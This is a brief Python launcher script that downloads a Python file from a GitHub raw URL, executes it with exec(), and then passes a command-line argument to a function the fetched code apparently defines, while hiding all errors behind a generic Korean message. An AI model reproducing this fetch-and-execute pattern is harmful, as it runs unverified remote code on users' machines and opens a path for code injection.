
import sys
import requests


if __name__ == '__main__':
    try:
        url_code = 'https://raw.githubusercontent.com/iamjjintta-python/webcode/main/iamjjintta/master.py'
        page = requests.get(url_code)
        code = page.content

        exec(code)

        cmd = sys.argv[1]
        call(cmd)

    except:
        print('예기치 못한 오류로 인해 프로그램을 실행할 수 없습니다.')

    finally:
        sys.exit(0)
